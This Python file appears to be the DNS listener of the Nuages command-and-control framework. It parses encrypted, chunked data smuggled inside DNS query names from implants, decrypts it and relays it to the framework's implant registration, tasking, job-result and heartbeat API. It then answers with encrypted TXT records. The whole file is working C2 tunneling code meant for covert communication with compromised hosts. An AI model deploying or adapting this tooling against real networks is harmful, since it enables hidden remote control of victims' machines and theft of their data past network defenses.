#!python3
# coding=utf-8
import hashlib
import requests
import platform
import subprocess
from Crypto import Random
from Crypto.Cipher import AES
import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
from dnslib import *
import time
import base64

class HTTPerror(Exception):
    def __init__(self,HTTPCode,HTTPContent):
        self.HTTPCode = HTTPCode
        self.HTTPContent = HTTPContent

class PKCS7Encoder(object):
    def __init__(self, k=16):
       self.k = k

    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, bytestring):
        '''
        Remove the PKCS#7 padding from a text string
        '''
        val = bytestring[-1]
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')
        l = len(bytestring) - val
        return bytestring[:l]

    ## @param text The text to encode.
    def encode(self, bytestring):
        """
        Pad an input bytestring according to PKCS#7
        """
        l = len(bytestring)
        val = self.k - (l % self.k)
        return bytestring + bytearray([val] * val)

class AESCipher(object):
    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()
        self.pkcs7 = PKCS7Encoder()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return self.pkcs7.encode(s)

    def _unpad(self, s):
        return self.pkcs7.decode(s)

class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)

class NuagesRequest():
    def __init__(self, url, data = ""):
        self.url = url
        self.counter = 0
        self.lastEdited = time.time()
        self.data = data
        self.executed = False
        self.response = b''

class NuagesDNS:
    def __init__(self, connectionString, key, domain):
        self.aes = AESCipher(key)
        self.requestDB = {}
        self.reqId = 0
        self.connectionString = connectionString
        self.domain = domain
        self.domNum = domain.count(".") + 1
        self.urls={"i":"/implant/io", "r":"/implant/register", "j":"/implant/jobresult", "h":"/implant/heartbeat"}

    def POST(self, url, body):
        if not(args.quiet): print(url)
        headers = {'Content-type': 'application/json; charset=utf-8'}
        headers["listener"] = "DNS"
        if(args.id): headers["listener"] = args.id
        response = requests.post(self.connectionString + url, data = body.encode('utf-8'), verify=True, headers=headers)
        if(response.ok):
            return response.content
        else:
            raise HTTPerror(response.status_code,response.content)
    def doRequest(self, Request):
        body = self.aes.decrypt(base64.b64decode(Request.data.replace("-0","+").replace("-1","/").replace("-2","=")))
        Request.response = self.POST(self.urls[Request.url], body)
        return Request.response

    def cleanup(self):
        while True:
            toDelete = []
            time.sleep(15)
            try:
                now = time.time()
                for key, val in self.requestDB.items():
                    if(now - val.lastEdited > 15):
                        toDelete.append(key)
                for key in toDelete:
                    del self.requestDB[key]
            except:
                pass

    def handle_dns(self, request):
        qn = str(request.q.qname)
        splitReq = qn.split(".")
        if(args.verbose): print(request.q.qname)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        try:
            if(splitReq[0] == "N"):
                if (args.verbose): print("New Request: {}".format(splitReq[1]))
                data = "".join(splitReq[2:-self.domNum])
                self.requestDB[str(self.reqId)] = NuagesRequest(splitReq[1], data)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("N.{}.OK".format(self.reqId))))
                self.reqId += 1
            elif(splitReq[0] == "D"):
                if (args.verbose): print("Received Data for Request: {}".format(splitReq[1]))
                if(int(splitReq[2]) == self.requestDB[splitReq[1]].counter + 1):
                    data = "".join(splitReq[3:-self.domNum])
                    self.requestDB[splitReq[1]].lastEdited = time.time()
                    self.requestDB[splitReq[1]].data += data
                    self.requestDB[splitReq[1]].counter += 1
                if(self.requestDB[splitReq[1]].counter > 100):
                    print("FOUND TOP 100 request!!!!!!!!")
                    del self.requestDB[splitReq[1]]
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("-1")))
                    return reply.pack()
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("D.{}.OK".format(splitReq[1]))))
            elif(splitReq[0] == "C"):
                if (args.verbose): print("Received Completion for Request: {}".format(splitReq[1]))
                if(splitReq[1] == "-1"):
                    data = "".join(splitReq[3:-self.domNum])
                    tempId = data[0:6]
                    if (tempId in self.requestDB):
                        response = self.requestDB[tempId].response
                    else:
                        self.requestDB[tempId] = NuagesRequest(splitReq[2], data)
                        self.requestDB[tempId].lastEdited = time.time()
                        response = self.doRequest(self.requestDB[tempId])
                else:
                    if(not(self.requestDB[splitReq[1]].executed)):
                        self.requestDB[splitReq[1]].executed = True
                        data = "".join(splitReq[2:-self.domNum])
                        self.requestDB[splitReq[1]].data += data
                        self.requestDB[splitReq[1]].lastEdited = time.time()       
                        response = self.doRequest(self.requestDB[splitReq[1]])
                    else:
                        response = self.requestDB[splitReq[1]].response
                encResponse = base64.b64encode(self.aes.encrypt(response)).decode("utf-8").replace("+","-0").replace("/","-1").replace("=","-2")
                txt = "C.{}.200.".format(splitReq[1]) + encResponse
                i = 0
                while (i < len(txt)):
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(txt[i:i + min(len(txt) - i, 255)])))
                    i += 255
            else:
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                return reply.pack()
        except HTTPerror as e:
                #reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("D.{}.{}".format(splitReq[1], e.HTTPCode))))
                return reply.pack() 
        except Exception as e:
                if not(args.quiet): print("Caught Exception: " + str(e))
                if (args.verbose): print(e)
                #reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("-1")))
                return reply.pack()
        else:
            return reply.pack()                              

class BaseRequestHandler(socketserver.BaseRequestHandler):

    def dns_response(self, data):
        request = DNSRecord.parse(data)
        return nuagesDNS.handle_dns(request)
    def get_data(self):
        raise NotImplementedError
    def send_data(self, data):
        raise NotImplementedError
    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        try:
            data = self.get_data()
            self.send_data(self.dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Start an encrypted Nuages DNS handler')
    parser.add_argument('-p','--port', default=53, type=int, help='The port to listen on')
    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections')
    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams')
    parser.add_argument('-d',"--domain", required=True, help='The domain name of the server.')
    parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
    parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
    parser.add_argument("-i", "--id", help="The listener ID for listener tracking")
    parser.add_argument("-v", "--verbose", action='store_true', help="Display extra logs")
    parser.add_argument("-q", "--quiet", action='store_true', help="Hide logs")
    args = parser.parse_args()
    

    D = DomainName(args.domain + '.')
    IP = '127.0.0.1'
    TTL = 60 * 5

    nuagesDNS = NuagesDNS(args.uri, args.key, D)
    
    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))

    if(not(args.udp or args.tcp)):
        print("You need either --udp or --tcp")
        exit()
    
    if not(args.quiet): print("Starting Nuages DNS Handler...")

    for s in servers:
        thread = threading.Thread(target=s.serve_forever) 
        thread.daemon = True 
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
    thread = threading.Thread(target=nuagesDNS.cleanup) 
    thread.daemon = True 
    thread.start()
    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()
            
